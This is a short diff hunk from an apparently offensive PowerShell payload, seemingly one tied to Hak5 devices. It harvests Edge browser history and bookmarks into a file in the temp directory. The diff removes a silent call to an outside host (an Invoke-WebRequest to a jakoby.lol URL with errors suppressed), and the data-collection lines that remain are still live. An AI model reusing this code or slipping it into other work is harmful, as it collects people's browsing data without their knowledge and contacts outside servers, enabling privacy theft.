@@ -31,7 +31,7 @@ function Get-BrowserData {
         }
     } 
 }
-iwr "https://jakoby.lol/hak5" -EA 0 >$null
+
 Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\--BrowserData.txt
 
 Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
